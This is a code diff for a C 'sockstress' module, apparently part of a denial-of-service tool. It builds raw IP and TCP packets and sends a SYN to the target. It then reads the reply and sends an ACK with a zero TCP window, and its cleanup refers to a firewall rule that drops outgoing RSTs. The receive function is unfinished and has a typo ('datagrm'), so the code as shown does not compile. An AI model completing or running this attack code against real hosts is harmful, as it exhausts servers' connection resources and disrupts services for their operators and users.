@@ -13,58 +13,61 @@
 
 #include "sockstress.h"
 
-/* static void send_tcp_syn(cfg_atk_t *cfg) */
-/* { */
-/* 	if (!cfg) */
-/* 		INFOEE("Cannot send SYN TCP because cfg is NULL"); */
-/*  */
-/* 	struct tcphdr tcph; */
-/*  */
-/* 	// fill up the tcpheader */
-/* 	memset(&tcph, 0, sizeof(tcph)); */
-/* 	tcph.th_sport = htons(port_random()); */
-/* 	tcph.th_dport = cfg->daddr.sin_port; */
-/* 	tcph.th_seq   = htonl(cfg->seq); */
-/* 	tcph.th_ack   = htonl(0); */
-/* 	tcph.th_x2	  = 0; */
-/* 	tcph.th_off   = 5; */
-/* 	tcph.th_flags = TH_SYN; */
-/* 	tcph.th_win   = htons(TCP_MAXWIN); */
-/* 	tcph.th_urp   = htons(0); */
-/* 	tcph.th_sum   = tcp4_checksum(&cfg->iph, &tcph); */
-/*  */
-/* 	memset(cfg->tcphdr_start, 0, sizeof(tcph)); */
-/* 	memcpy(cfg->tcphdr_start, &tcph, sizeof(tcph)); */
-/*  */
-/* 	if (sendto(cfg->sk, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->daddr, sizeof(cfg->daddr)) < 0) */
-/* 		INFOEE("Cannot send syn packet"); */
-/* } */
+// sock_cfg_t 
+typedef struct sock_cfg_t{
+	int socket;	 
+	struct sockaddr_in in;
+	struct iphdr *iph;
+	struct tcphdr *tcph;
+	uint8_t *datagram;
+	uint16_t datagram_len;
+} sock_cfg_t;
 
-/* static void send_tcp_ack(cfg_atk_t *cfg) */
-/* { */
-/* 	if(!cfg) */
-/* 		INFOEE("Cannot send ACK TCP because cfg is NULL"); */
-/*  */
-/* 	struct tcphdr tcph; */
-/* 	// fill up the tcpheader */
-/* 	memset(&tcph, 0, sizeof(tcph)); */
-/* 	tcph.th_sport = htons(port_random()); */
-/* 	tcph.th_dport = cfg->daddr.sin_port; */
-/* 	tcph.th_seq   = htonl(cfg->seq); */
-/* 	tcph.th_ack   = htonl(0); */
-/* 	tcph.th_x2	  = 0; */
-/* 	tcph.th_off   = 5; */
-/* 	tcph.th_flags = TH_ACK; */
-/* 	tcph.th_win   = htons(0); #<{(|this|)}># */
-/* 	tcph.th_urp   = htons(0); */
-/* 	tcph.th_sum   = tcp4_checksum(&cfg->iph, &tcph); */
-/*  */
-/* 	memset(cfg->tcphdr_start, 0, sizeof(tcph)); */
-/* 	memcpy(cfg->tcphdr_start, &tcph, sizeof(tcph)); */
-/*  */
-/* 	if (sendto(cfg->sk, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->daddr, sizeof(cfg->daddr)) < 0) */
-/* 		INFOEE("Cannot send syn packet"); */
-/* } */
+// sockstress global config
+static sock_cfg_t *conf;
+
+static void send_tcp_syn(sock_cfg_t *cfg)
+{
+	if (!cfg)
+		INFOEE("Cannot send SYN TCP because cfg is NULL");
+
+	cfg->tcph->th_sport = htons(U16_RAND());
+	cfg->tcph->th_seq   = htonl(U32_RAND());
+	cfg->tcph->th_flags = TH_SYN;
+	cfg->tcph->th_win   = htons(TCP_MAXWIN);
+	cfg->tcph->th_sum   = tcp4_checksum(cfg->iph, cfg->tcph);
+	
+	if (sendto(cfg->socket, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->in, sizeof(cfg->in)) < 0)
+		INFOEE("Cannot send syn packet");
+}
+
+static void recv_tcp_ack(sock_cfg_t *cfg)
+{
+	if (!cfg)
+		INFOEE("Cannot recvive ACK TCP because cfg is NULL");
+
+	char datagram[IP_MAXPACKET];
+	socklen_t len = sizeof(cfg->in);
+	if (recvfrom(cfg->socket, datagram, IP_MAXPACKET, 0, (struct sockaddr *)&cfg->in, &len) < 0)
+		INFOEE("Cannot recvive ack packet");
+
+	// unpack only tcp part
+	struct tcphdr *tcph = (struct tcphdr *)(datagrm + sizeof(struct iphdr));
+	// TODO
+}
+
+static void send_tcp_ack(sock_cfg_t *cfg)
+{
+	if(!cfg)
+		INFOEE("Cannot send ACK TCP because cfg is NULL");
+
+	cfg->tcph->th_flags = TH_ACK;
+	cfg->tcph->th_win   = htons(0); /*this*/
+	cfg->tcph->th_sum   = tcp4_checksum(cfg->iph, cfg->tcph);
+
+	if (sendto(cfg->socket, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->in, sizeof(cfg->in)) < 0)
+		INFOEE("Cannot send syn packet");
+}
 
 /**
  * sockstress_init
@@ -111,6 +114,7 @@ static void sockstress_init(arguments args)
 
 	// fill up the ip header
 	struct iphdr iph;
+	memset(&iph, 0, sizeof(iph));
 	iph.version  = 4; /* ipv version 4 */
 	iph.ihl		 = 5; /* 20 bytes ip header length */
 	iph.tos		 = 0;
@@ -122,6 +126,33 @@ static void sockstress_init(arguments args)
 	iph.daddr	 = daddr.sin_addr.s_addr;
 	iph.protocol = IPPROTO_TCP;
 	iph.check	 = ip4_checksum(&iph);
+
+	struct tcphdr tcph;
+	memset(&tcph, 0, sizeof(tcph));
+	tcph.th_dport = daddr.sin_port;
+	tcph.th_ack   = htonl(0);
+	tcph.th_x2	  = 0;
+	tcph.th_off   = 5;
+	tcph.th_win   = htons(TCP_MAXWIN);
+	tcph.th_urp   = htons(0);
+
+	if (!conf)
+		conf = xzmalloc(sizeof(*conf));
+	else 
+		DEBUG("Already the internal sockstress configuration is initialized");
+
+	if(!conf->datagram) {
+		conf->datagram_len = sizeof(*conf->datagram) * (sizeof(struct iphdr) + sizeof(struct tcphdr));
+		conf->datagram = xzmalloc(conf->datagram_len);
+	} else
+		DEBUG("Already the internal datagram buffer initialized");
+
+	memcpy(&conf->in, &daddr, sizeof(daddr));
+	conf->socket = sk;
+	memcpy(conf->datagram, &iph, sizeof(iph));
+	conf->iph = (struct iphdr *)(conf->datagram);
+	memcpy(conf->datagram+sizeof(iph), &tcph, sizeof(tcph));
+	conf->tcph = (struct tcphdr *)(conf->datagram+sizeof(iph));
 }
 
 /**
@@ -130,7 +161,9 @@ static void sockstress_init(arguments args)
  */
 static void sockstress_attack(void)
 {
-
+	send_tcp_syn(conf);
+	recv_tcp_ack(conf);
+	send_tcp_ack(conf);
 }
 
 /**
@@ -146,6 +179,10 @@ static void sockstress_cleanup(void)
 	if (!WIFEXITED(err))
 		INFOEE("Could not set the firewall to drop all rst's");
 
+	xfree(conf->datagram);
+	if (close(conf->socket) < 0) 
+		INFOEE("Cannot close the socket");
+	xfree(conf);
 }
 
 impl_t *sockstress_new()
